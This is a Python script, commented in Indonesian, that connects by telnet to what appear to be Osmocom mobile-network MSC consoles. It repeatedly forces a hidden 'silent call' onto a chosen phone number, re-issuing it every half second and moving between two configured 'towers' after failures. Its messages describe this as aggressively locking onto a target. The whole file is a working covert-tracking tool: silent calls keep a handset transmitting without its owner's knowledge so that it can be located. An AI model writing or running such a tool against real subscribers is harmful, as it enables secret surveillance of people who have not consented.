#!/usr/bin/env python3
import telnetlib
import time
import sys
import warnings
from datetime import datetime

warnings.filterwarnings("ignore", category=DeprecationWarning)

TARGET_MSISDN = "1001" 
MSCS = [
    {"nama": "TOWER USB", "host": "127.0.0.1", "port": 4254},
    {"nama": "TOWER LAN", "host": "10.0.0.1",  "port": 4254}
]

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def eksekusi_silent_call_agresif(msc, msisdn):
    print(f"\n[+] [{get_time()}] 🚀 MODE AGRESIF: Mengunci Target di {msc['nama']}...")
    
    try:
        tn = telnetlib.Telnet(msc['host'], msc['port'], timeout=5)
        tn.read_until(b"> ")
        tn.write(b"enable\n")
        tn.read_until(b"# ")

        fail_count = 0

        while True:
            tn.read_very_eager() # Bersihkan sisa output sebelumnya
            
            # Kirim perintah
            cmd = f"subscriber msisdn {msisdn} silent-call start any speech-fr\n"
            tn.write(cmd.encode('ascii'))
            
            # Baca cepat (Timeout diperkecil jadi 1 detik)
            output = tn.read_until(b"# ", timeout=1).decode('ascii')

            if "Success" in output:
                # Kalau sukses start baru
                print(f"[{get_time()}] ⚡ RE-LOCK: Sinyal ditembak ulang!")
                fail_count = 0
                time.sleep(0.5) 
            
            elif "busy" in output or "active" in output:
                # Kalau dibilang busy, berarti MASIH NYAMBUNG.
                # Kita print titik saja biar gak nyampah, dan sleep SANGAT SINGKAT
                print(".", end='', flush=True) 
                fail_count = 0
                
                # --- RAHASIANYA DI SINI ---
                # Jangan tidur lama-lama. Cek lagi setiap 0.5 detik.
                # Biar kalau putus, langsung ketahuan.
                time.sleep(0.5) 

            elif "failed" in output:
                print(f"\n[{get_time()}] ❌ Putus di {msc['nama']}. Mencoba lagi...")
                fail_count += 1
                if fail_count > 5: return False # Pindah tower kalau gagal 5x berturut
                time.sleep(0.2)

            else:
                # Handling status aneh
                time.sleep(0.2)

    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# --- MAIN ---
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_MSISDN
    print(f"=== SILENT CALLER AGRESIF (Target: {target}) ===")

    while True:
        for msc in MSCS:
            try:
                # Cek keberadaan user dulu (Ping)
                tn = telnetlib.Telnet(msc['host'], msc['port'], timeout=1)
                tn.read_until(b"> ")
                tn.write(b"enable\n")
                tn.read_until(b"# ")
                tn.write(f"show subscriber msisdn {target}\n".encode('ascii'))
                res = tn.read_until(b"# ", timeout=1).decode('ascii')
                tn.close()

                if "IMSI" in res:
                    eksekusi_silent_call_agresif(msc, target)
            except:
                pass
        
        time.sleep(2)
